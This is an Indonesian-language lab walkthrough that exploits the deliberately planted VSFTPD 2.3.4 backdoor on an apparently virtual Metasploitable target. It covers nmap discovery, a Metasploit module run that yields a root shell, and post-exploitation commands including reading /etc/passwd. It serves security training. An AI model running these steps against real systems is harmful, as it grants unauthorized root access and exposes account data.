# Introduction

**Vsftpd**, singkatan dari **_Very Secure FTP Daemon_**, adalah server FTP (_File Transfer Protocol_) yang dirancang dengan fokus utama pada keamanan dan stabilitas. Vsftpd dibuat untuk menjadi server FTP yang ringan, cepat, dan tangguh, yang membuatnya sangat populer di lingkungan Linux.

Kerentanan pada **VSFTPD versi 2.3.4** bukan disebabkan oleh kesalahan pemrograman biasa (_bug_), melainkan karena adanya _backdoor_ yang disisipkan secara sengaja oleh pihak yang tidak bertanggung jawab.

Pada Juli 2011, terungkap bahwa _hacker_ berhasil menyusup ke dalam repositori kode sumber resmi VSFTPD. Mereka kemudian menyisipkan satu baris kode berbahaya ke dalam versi 2.3.4 yang kemudian dirilis secara publik.

Kerentanan ini sangat serius karena merupakan pintu belakang yang disisipkan secara sengaja dan memberikan hak akses tertinggi (_privilege escalation_). Kerentanan ini ditemukan dan diperbaiki dengan cepat, sehingga versi-versi VSFTPD yang lebih baru sudah tidak memiliki masalah ini.

**1. _Reconnaissence_**

- Analisis jaringan yang sedang dipakai untuk mengetahui IP yang digunakan

```
ifconfig
```
- Memindai seluruh jaringan internal yang saling terhubung untuk mencari target
```
nmap -sn <ip_range>

Ex. nmap -sn 192.168.1.0/24   //scanning the whole connected divices
```
**2. _Scanning and Enumeration_**

Memindai spesifik port dan layanan, port default FTP 21
```
nmap -p 21 -sV <ip_metasploitable>
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 08:00:27:68:17:AC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix
```
**3. _Gaining Access (Exploitation)_**
- Menjalankan Metasploit Framework
```
msfconsole
```
- Mencari modul eksploitasi yang sesuai dengan kerentanan yang ditemukan
```
search vsftpd 2.3.4
```

```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

```
- Memilih dan mengatur eksploitasi
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <ip_metasploitable>
set LHOST <ip_kali_linux>
```
- Cek _requirement_, pastikan tidak ada yang kurang atau terlewat
```
show options
```
- Jika sudah lengkap, jalankan serangan
```
exploit

```

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.22.64:21 - The port used by the backdoor bind listener is already open
[+] 192.168.22.64:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.22.63:33787 -> 192.168.22.64:6200) at 2025-08-21 07:03:24 -0400

```
**4. _Maintaining accsess dan Post exploitation_**
- Verifikasi user atau akses root
```
whoami
```
- Eksplorasi sistem
```
ls -l      //melihat list file dan direktory

```
```
uname -a   //melihat versi kernel dan informasi sistem

```
```
cat /etc/passwd  //melihat daftar user

```
